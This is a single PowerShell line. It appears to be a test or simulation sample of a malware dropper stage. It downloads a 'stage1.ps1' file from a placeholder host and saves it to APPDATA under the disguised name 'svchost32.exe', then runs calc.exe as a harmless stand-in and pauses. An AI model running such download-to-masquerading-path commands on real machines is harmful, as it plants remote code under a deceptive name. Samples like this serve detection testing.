
$Stage1Url = 'http://contoso.com:8080/stage1.ps1'; $WorkingPath = "$env:APPDATA\svchost32.exe"; $TimeoutSec = 54; Invoke-WebRequest -Uri $Stage1Url -OutFile $WorkingPath -UseBasicParsing; Start-Process -FilePath "calc.exe"; $StageMarker = "stage-33"; Start-Sleep -Seconds 30
